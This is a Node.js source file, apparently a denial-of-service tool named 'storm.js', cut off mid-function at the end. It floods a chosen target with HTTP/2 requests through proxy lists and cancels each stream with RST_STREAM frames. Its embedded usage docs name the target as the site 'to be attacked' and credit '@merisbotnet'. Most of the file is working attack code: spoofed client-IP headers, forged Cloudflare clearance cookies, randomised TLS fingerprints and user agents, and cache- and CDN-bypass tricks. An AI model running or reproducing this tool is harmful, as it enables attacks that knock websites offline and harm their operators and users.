const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
HPACK.prototype.setTableSize(4096);
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const axios = require('axios');
const { exec } = require('child_process');
const https = require('https');
const http2 = require('http2');

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--cdn', value: get_option('--cdn') },
    { flag: '--uam', value: get_option('--uam') },
    { flag: '--precheck', value: get_option('--precheck') },
    { flag: '--randpath', value: get_option('--randpath') },
    { flag: '--bypass-cache', value: get_option('--bypass-cache') },
    { flag: '--mobile-mode', value: get_option('--mobile-mode') },
    { flag: '--advanced-bypass', value: get_option('--advanced-bypass') }
];

const bypassCacheEnabled = enabled('bypass-cache') || enabled('advanced-bypass');
const mobileModeEnabled = enabled('mobile-mode');
const advancedBypassEnabled = enabled('advanced-bypass');

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    }

    if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    }

    if (typeof optionValue === 'string') {
        return optionValue;
    }

    return false;
}

// ========== ADVANCED CACHE BYPASS FUNCTIONS ==========

function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function generateRandomToken() {
    return crypto.randomBytes(20).toString('hex');
}

function getMobileUserAgent() {
    const mobileAgents = [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.147 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.147 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.147 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1'
    ];
    return mobileAgents[Math.floor(Math.random() * mobileAgents.length)];
}

function generateBypassCookies() {
    const bypassCookies = [
        `cf_clearance=${randstrr(100)}_${Date.now()}`,
        `cf_chl_seq=${randstrr(50)}`,
        `cf_chl_prog=${randstrr(30)}`,
        `session_bypass=${generateUUID()}`,
        `cache_buster=${Date.now()}`,
        `dynamic_content=1`,
        `nocache=${Math.random().toString(36).substring(2, 15)}`,
        `bypass_token=${generateRandomToken()}`,
        `edge_cache=bypass`
    ];
    
    return bypassCookies[Math.floor(Math.random() * bypassCookies.length)];
}

function advancedPathRandomization(originalPath) {
    if (!randpathEnabled) return originalPath;
    
    const timestamp = Date.now();
    const randomHash = crypto.createHash('md5').update(timestamp.toString()).digest('hex').substring(0, 8);
    
    const bypassPatterns = [
        `?__cf_chl_rt_tk=${randstrr(40)}_${timestamp}`,
        `?cache_bust=${timestamp}`,
        `?nocache=${Math.random().toString(36).substring(2)}`,
        `?bypass=${generateUUID()}`,
        `?t=${timestamp}`,
        `?v=${randstrr(8)}`,
        `?cb=${randomHash}`,
        `?rnd=${Math.random().toString(36).substring(2, 10)}`,
        `?_=${timestamp}`,
        `?~${randstrr(5)}=${randstrr(6)}`,
        `?${randstrr(4)}=${randstrr(6)}&${randstrr(5)}=${randstrr(7)}`,
        `?#${randstrr(10)}`,
        `?cache=disable&time=${timestamp}`,
        `?dynamic=1&session=${generateUUID()}`,
        `?force_refresh=1&token=${generateRandomToken()}`,
        `?platform=mobile&device_id=${randstrr(16)}`
    ];
    
    const selectedPattern = bypassPatterns[Math.floor(Math.random() * bypassPatterns.length)];
    
    if (originalPath.includes('?')) {
        if (Math.random() > 0.7) {
            return originalPath.split('?')[0] + selectedPattern;
        } else {
            return originalPath + '&' + selectedPattern.replace('?', '');
        }
    } else {
        return originalPath + selectedPattern;
    }
}

function getAdvancedBypassHeaders() {
    const timestamp = Date.now();
    const requestId = generateUUID();
    
    return {
        'Cache-Control': 'no-cache, no-store, must-revalidate, private, max-age=0',
        'Pragma': 'no-cache',
        'Expires': '0',
        'CDN-Cache-Control': 'no-cache',
        'CF-Cache-Bypass': '1',
        'CF-Device-Type': Math.random() > 0.5 ? 'mobile' : 'desktop',
        'CF-IP': `1.1.1.${Math.floor(Math.random() * 255)}`,
        'X-Request-Start': `t=${timestamp}`,
        'X-Request-ID': requestId,
        'X-Correlation-ID': generateUUID(),
        'X-Timestamp': timestamp.toString(),
        'X-Forwarded-Proto': 'https',
        'X-Forwarded-Host': url.hostname,
        'X-Forwarded-Port': '443',
        'X-Forwarded-For': `1.1.1.${Math.floor(Math.random() * 255)}`,
        'X-Real-IP': `1.1.1.${Math.floor(Math.random() * 255)}`,
        'True-Client-IP': `1.1.1.${Math.floor(Math.random() * 255)}`,
        'CF-Connecting-IP': `1.1.1.${Math.floor(Math.random() * 255)}`,
        'Authorization': Math.random() > 0.7 ? `Bearer ${generateRandomToken()}` : undefined,
        'X-API-Key': Math.random() > 0.8 ? generateRandomToken() : undefined,
        'X-Mode': 'live',
        'X-No-Cache': 'true',
        'X-Accel-Expires': '0',
        'X-Cache-Bypass': '1',
        'X-Dynamic-Content': 'true',
        'X-Edge-Cache-Bypass': '1',
        'X-OperaMini-Phone-UA': Math.random() > 0.5 ? getMobileUserAgent() : undefined,
        'X-Device-User-Agent': Math.random() > 0.5 ? getMobileUserAgent() : undefined
    };
}

function timingBasedBypass() {
    const baseDelay = humanizedDelay();
    const jitter = Math.random() * 200 - 100;
    let finalDelay = Math.max(50, baseDelay + jitter);
    
    if (Math.random() < 0.03) {
        finalDelay += 1000 + Math.random() * 3000;
    }
    
    if (Math.random() < 0.02) {
        finalDelay = Math.max(10, finalDelay * 0.3);
    }
    
    return finalDelay;
}

// ========== END OF ADVANCED CACHE BYPASS FUNCTIONS ==========

const docss = `
All the parameters written below all work, so please pay attention. This method is a method that can be customized, almost anything can be customized, the parameter behind it using "--example" is an optional parameter, this method uses rststream to cancel each request. greetings from @udpzero

1. <GET/POST>: Determines the type of HTTP method to be used, whether GET or POST. Example: <GET> or <POST>.
2. <target>: Provides the URL or target to be attacked. Example: https://example.com.
3. <time>: Provides the duration or time in seconds to run the attack. Example: 60 (for a 60 second attack).
4. <threads>: Specifies the number of threads or concurrent connections to create. Example: 50.
5. <ratelimit>: Sets the rate limit for requests, if any. Example: 1000 (limit 1000 requests per second).
6. <proxy>: Specifies proxy settings that may be required. Example: http://proxy.example.com:8080.
7. --query 1/2/3/4/5/6/7/8/9/10: Optional parameters to specify a specific request or query type. Example: --query 3.
8. --delay <1-100>: Optional parameter to specify the delay between requests in milliseconds. Example: --delay 50.
9. --cookies=key: Optional parameter to specify cookies to include in the request. Example: --cookie sessionID=abc123.
10. --precheck true/false: Optional parameter to enable periodic checking mode on the target, Example: --precheck true.
11. --bfm true/false: Optional parameter to enable or disable botfightmode. Example: --bfm true.
12. --httpver "h2": Optional parameter to select alpn version. Example: --hver "h2, http/1.1, h1".
13. --referer %RAND% / https://target.com: Optional parameter to specify the referer header. Example: --referer https://example.com.
14. --postdata "user=f&pass=f": Optional parameter to include data in a POST request. Example: --postdata "username=admin&password=123".
15. --ua "user-agent": Optional parameter to specify the User-Agent header. Example: --ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3".
16. --secua "sec-ch-ua": Optional parameter to define the Sec-CH-UA header. Example: --secua "Chromium;v=88, Firefox;v=85, Not A;Brand;v=99".
17. --header "user-ganet@kontol#referer@https://super.wow": Optional parameter to define a custom header. Example: --header "user-ganet@kontol#referer@https://super.wow".
18. --ratelimit true/false: Optional parameter to enable ratelmit mode and bypass. Example: --ratelimit true/false.
19. --randpath true/false: Optional parameter to enable random path mode. Example: --randpath true/false.
20. --randrate true/false: Optional parameter to enable random rate mode. Example: --randrate.
21. --debug true/false: Optional parameter to display errors or output from this script. Example: --debug true.
22. type Random string (%RAND% random string&int length 6) (%RANDLN% random string&int length 15) (%RANDTN% random token length 20) (%RANDL% random string length 20) (%RANDN% random int length 20) this function is only available in path. Example: https://example.com/%RAND%.
23. --cdn true/false: to bypass cdn/static like web.app firebase namecheapcdn Example: --cdn true.
24. --full can give a very big impact Can With Amazon, Namecheap, Nasa, Cia / Etc [buffer 10k]
25. --legit provide excess headers and superior bypass, risk of being detected as BAD SOURCE. provide headers randomly for each request
26. --bypass-cache true/false: Enable advanced cache bypass techniques
27. --mobile-mode true/false: Simulate mobile device traffic
28. --advanced-bypass true/false: Enable advanced bypass techniques

Usage: node storm.js GET https://example.com/ 60 10 100 proxy.txt
`;

const blockedDomain = [".gov", ".edu", ".go.id"];
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date('2028-03-30');

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const cdnindex = process.argv.indexOf('--cdn');
const cdn = cdnindex !== -1 && cdnindex + 1 < process.argv.length ? process.argv[cdnindex + 1] : undefined;

const customIPindex = process.argv.indexOf('--ip');
const customIP = customIPindex !== -1 && customIPindex + 1 < process.argv.length ? process.argv[customIPindex + 1] : undefined;

const customUAindex = process.argv.indexOf('--useragent');
const customUA = customUAindex !== -1 && customUAindex + 1 < process.argv.length ? process.argv[customUAindex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--httpver');
const useLegitHeaders = process.argv.includes('--legit');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const docs = process.argv.indexOf('--show');
const docsvalue = docs !== -1 && docs + 1 < process.argv.length ? process.argv[docs + 1] : undefined;

if (docsvalue) {
if (docsvalue.includes('docs')) {
    console.clear();
    console.log(docss);
    process.exit(1);
}
}

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`node ${process.argv[1]} --show docs`);
    process.exit(1);
}

let hcookie = '';

const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
    console.error('Error request method only can GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('Error protocol can only https:// or http://');
    process.exit(1);
}

if (isNaN(time) || time <= 0) {
    console.error('Error invalid time format')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads format')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0) {
    console.error(`Error ratelimit format`)
    process.exit(1);
}

 if (enabled('uam')) {
    hcookie = `cf_chl`;
}

 if (enabled('cdn')) {
    const requestHeaders = {
        'Accept': 'text/html',
        'Accept-Language': 'en-US,en;q=0.5',
    };
    const buffer = Buffer.alloc(1024);
    const performRequest = async () => {
        try {
            await axios({
                method: POST,
                url: url,
                headers: requestHeaders,
                responseType: 'arraybuffer',
                maxRedirects: 0,
                timeout: 1000,
            });
        } catch (error) {
            console.error(`Request failed: ${error.message}`);
        }
    };
    const startFlood = async () => {
        const end = performance.now() + time * 1000;
        const interval = 1000 / ratelimit;
        while (performance.now() < end) {
            for (let i = 0; i < threads; i++) {
                setTimeout(() => {
                    performRequest();
                }, interval * i);
            }
            await new Promise(resolve => setTimeout(resolve, interval));
        }
    };
    startFlood();
}

const agentbokep = new https.Agent({
    rejectUnauthorized: false
});

 if (enabled('precheck')) {
    const timeoutPromise = new Promise((resolve, reject) => {
       setTimeout(() => {
          reject(new Error('Request timed out'));
      }, 5000);
   });
  const axiosPromise = axios.get(target, {
      httpsAgent: agentbokep,
      headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
        }
  });
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      console.clear();
      console.log('Attack Running! Love You @merisbotnet :) @udpzero');
      const { status, data } = response;
      console.log(`> Precheck: ${status}`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.clear();
        console.log('Attack Running! Love You @merisbotnet :) @udpzero');
        console.log(`> Precheck: Request Timed Out`);
      } else if (error.response) {
        console.clear();
        console.log('Attack Running! Love You @merisbotnet :) @udpzero');
        console.log(`> Precheck: ${error.response.status}`);
      } else {
        console.clear();
        console.log('Attack Running! Love You @merisbotnet :) @udpzero');
        console.log(`> Precheck: ${new Date().toLocaleString()} ${error.message}`);
      }
    });
}

const randpathEnabled = enabled('randpath');
const timestampString1 = timestamp.toString().substring(0, 10);
function humanizedDelay() {
  const baseDelay = delay || 1000 / ratelimit;
  const variation = baseDelay * 0.3 * (Math.random() * 2 - 1);
  return Math.max(50, baseDelay + variation);
}

const dynamicHeaders = {
  accept: [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
  ],
  'accept-language': [
    'en-US,en;q=0.9',
    'en-US,en;q=0.8',
    'id-ID,id;q=0.9',
    'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.9',
    'es-ES,es;q=0.9'
  ],
  'accept-encoding': [
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate',
    'gzip, deflate, br, zstd'
  ]
};

function getRandomHeader(type) {
  return dynamicHeaders[type][Math.floor(Math.random() * dynamicHeaders[type].length)];
}

const tlsProfiles = [
  {
    ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_CCM_SHA256',
    sigalgs: 'ed25519:ed448:ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pkcs1_sha256'
  },
  {
    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_CCM_8_SHA256',
    sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha256:rsa_pkcs1_sha256'
  },
  {
    ciphers: 'TLS_AES_128_CCM_8_SHA256:TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256',
    sigalgs: 'rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp256r1_sha256'
  }
];

function getRandomTLSProfile() {
  return tlsProfiles[Math.floor(Math.random() * tlsProfiles.length)];
}

function randomizePath(originalPath) {
  if (!randpathEnabled) return originalPath;
  
  const randomParams = [];
  const paramCount = Math.floor(Math.random() * 3) + 1;
  
  for (let i = 0; i < paramCount; i++) {
    const paramName = generateRandomString(4, 8);
    const paramValue = generateRandomString(6, 12);
    randomParams.push(`${paramName}=${paramValue}`);
  }

  const addFragment = Math.random() > 0.7;
  const fragment = addFragment ? `#${generateRandomString(5, 10)}` : '';
  
  const separator = originalPath.includes('?') ? '&' : '?';
  return `${originalPath}${separator}${randomParams.join('&')}${fragment}`;
}

function generateRealisticUserAgent() {
  const platforms = [
    {
      name: 'Windows',
      versions: ['10.0', '11.0'],
      templates: [
        'Mozilla/5.0 (Windows NT {version}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chromeVersion} Safari/537.36',
        'Mozilla/5.0 (Windows NT {version}; Win64; x64; rv:{firefoxVersion}) Gecko/20100101 Firefox/{firefoxVersion}',
        'Mozilla/5.0 (Windows NT {version}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chromeVersion} Safari/537.36 Edg/{edgeVersion}'
      ]
    },
    {
      name: 'Mac',
      versions: ['10_15_7', '11_6_1', '12_0'],
      templates: [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X {version}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chromeVersion} Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X {version}; rv:{firefoxVersion}) Gecko/20100101 Firefox/{firefoxVersion}'
      ]
    },
    {
      name: 'Linux',
      versions: ['x86_64', 'i686'],
      templates: [
        'Mozilla/5.0 (X11; Linux {version}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chromeVersion} Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux {version}; rv:{firefoxVersion}) Gecko/20100101 Firefox/{firefoxVersion}'
      ]
    }
  ];

  const platform = platforms[Math.floor(Math.random() * platforms.length)];
  const version = platform.versions[Math.floor(Math.random() * platform.versions.length)];
  const template = platform.templates[Math.floor(Math.random() * platform.templates.length)];
  
  const chromeVersion = `${90 + Math.floor(Math.random() * 30)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 200)}`;
  const firefoxVersion = `${90 + Math.floor(Math.random() * 20)}.0`;
  const edgeVersion = `${90 + Math.floor(Math.random() * 30)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 200)}`;

  return template
    .replace('{version}', version)
    .replace('{chromeVersion}', chromeVersion)
    .replace('{firefoxVersion}', firefoxVersion)
    .replace('{edgeVersion}', edgeVersion);
}

function createTLSOptions() {
  const tlsProfile = getRandomTLSProfile();
  
  return {
    ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : 
                  forceHttp === undefined ? (Math.random() >= 0.5 ? ['h2'] : ['http/1.1']) : 
                  ['h2', 'http/1.1'],
    servername: url.host,
    ciphers: tlsProfile.ciphers,
    sigalgs: tlsProfile.sigalgs,
    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | 
                  crypto.constants.SSL_OP_NO_TICKET |
                  crypto.constants.SSL_OP_NO_SSLv2 |
                  crypto.constants.SSL_OP_NO_SSLv3 |
                  crypto.constants.SSL_OP_NO_COMPRESSION,
    secure: true,
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    rejectUnauthorized: false
  };
}

const pathValue = randpathEnabled
  ? (Math.random() < 1 / 100000
      ? `${url.pathname}?__cf_chl_rt_tk=${randstrr(30)}_${randstrr(12)}-${timestampString}-0-gaNy${randstrr(8)}`
      : `${url.pathname}?${generateRandomString(6, 7)}&${generateRandomString(6, 7)}`
    )
  : target.path;

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${ememmmmmemmeme(6, 6)}` : ememmmmmemmeme(6, 6);
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

function getRandomUserAgent() {
   const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
   const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
   const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES', 'id-ID'];
   const countryList = ['US', 'GB', 'FR', 'DE', 'ES', 'ID'];
   const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
   const os = osList[Math.floor(Math.random() * osList.length)];
   const browser = browserList[Math.floor(Math.random() * browserList.length)];
   const language = languageList[Math.floor(Math.random() * languageList.length)];
   const country = countryList[Math.floor(Math.random() * countryList.length)];
   const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
   const version = Math.floor(Math.random() * 100) + 1;
   const randomOrder = Math.floor(Math.random() * 6) + 1;
   const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
   const encryptedString = Buffer.from(userAgentString).toString('base64');
   let finalString = '';
   for (let i = 0; i < encryptedString.length; i++) {
     if (i % randomOrder === 0) {
       finalString += encryptedString.charAt(i);
     } else {
       finalString += encryptedString.charAt(i).toUpperCase();
     }
   }
   return finalString;
 }

const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
const operatingSystems = ["Linux", "Windows", "macOS", "Android", "iOS", "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX", "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS", "OS/2", "Minix", "Unix", "GODDIE", "WW2", "SNI", "GODISEE"];
const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
const cplist = [
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_CCM_SHA256',
    'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_CCM_8_SHA256',
    'TLS_AES_128_CCM_8_SHA256:TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256'
];
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
function generateUserAgent() {
    return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} (${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} (KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function pickCipher(){ return cplist[Math.floor(Math.random()*cplist.length)]; }

var cipper = pickCipher();

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');

let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const DYNAMIC_SETTINGS = {
  headerTableSize: [4096, 6144, 8192],
  initialWindowSize: [65535, 262144, 1048576],
  maxFrameSize: [16384, 32768, 65536]
};

function updateDynamicSettings() {
  custom_table = DYNAMIC_SETTINGS.headerTableSize[Math.floor(Math.random() * DYNAMIC_SETTINGS.headerTableSize.length)];
  custom_window = DYNAMIC_SETTINGS.initialWindowSize[Math.floor(Math.random() * DYNAMIC_SETTINGS.initialWindowSize.length)];
  custom_header = DYNAMIC_SETTINGS.maxFrameSize[Math.floor(Math.random() * DYNAMIC_SETTINGS.maxFrameSize.length)];
  custom_update = Math.floor(Math.random() * 20000000);
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, errorCode = 0xC) {
    const frame = Buffer.alloc(13);
    frame.writeUInt8(0, 0);
    frame.writeUInt16BE(4, 1);
    frame.writeUInt8(0x3, 3);
    frame.writeUInt8(0x0, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    frame.writeUInt32BE(errorCode >>> 0, 9);
    return frame;
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
